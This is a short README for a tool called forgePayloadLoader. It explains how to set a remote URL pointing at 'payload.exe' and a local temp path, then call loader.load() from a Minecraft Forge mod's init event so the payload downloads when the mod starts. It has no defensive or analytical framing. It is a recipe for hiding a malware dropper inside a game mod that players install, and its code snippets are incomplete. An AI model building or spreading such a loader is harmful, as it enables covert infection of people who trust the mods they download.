# forgePayloadLoader


# Usage

Edit the variables ```file_url``` and ```filePath``` to your target paths, make sure your mc has permissions to your download location
```
public class loader {
    public static String file_url = "http://example.com/payload.exe";
    public static String filePath = "/Users/Local/Temp/payload.exe";

    public static void load(){
```

# Adding to a forge mod
Add the function to the forge init Event
```
import me.decker.loader

@Mod.EventHandler
    public void init(FMLInitializationEvent event) throws IOException {
    
    loader.load();
    
    }
```
